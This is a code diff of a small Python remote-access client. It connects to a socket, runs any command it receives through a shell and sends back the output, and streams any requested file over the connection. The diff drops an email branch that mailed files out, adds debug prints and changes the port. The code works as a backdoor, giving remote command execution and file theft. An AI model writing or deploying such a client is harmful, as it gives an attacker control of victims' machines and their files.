@@ -70,33 +70,43 @@ def send_email(file_name):
     s.quit()
 
 
+import os
+import socket
+import subprocess
+
+
+def file_size(path):
+    return os.path.getsize(path)
+
+
 def client():
     s = socket.socket()
-    s.connect(('127.0.0.1', 8965))
+    s.connect(('127.0.0.1', 9984))
 
     # message = input('-> ')
     while True:
+        print('While True')
         data = s.recv(1024).decode('utf-8')
+        print('Got Data ', repr(data))
         if 'cmd' in data:
             try:
                 data = data.replace('cmd ', '')
                 s.send(subprocess.check_output(data, shell=True))
             except Exception:
                 s.send(f"Error with {data} command".encode('utf-8'))
+
         elif 'get file' in data:
             data = data.replace('get file ', '')
-            with open(data, 'rb') as f:
-                while EOFError(f):
-                    if s.recv(1024).decode('utf-8') == 'ok':
-                        s.sendall(f.read(1024))
-            s.sendall('complete'.encode('utf-8'))
-            f.flush()
-        elif 'send email ' in data:
-            data = data.replace('send email ', '')
-            send_email(data)
-
-
-
+            f = open(data, 'rb')
+            while True:
+                content = f.read(1024)
+                if content:
+                    s.sendall(content)
+                else:
+                    f.close()
+                    break
+            # s.send('complete'.encode('utf-8'))
+            print('yyyyyyyyyyyyyyyyyyyyyyyy')
         else:
             s.send('The command was not found'.encode('utf-8'))
 
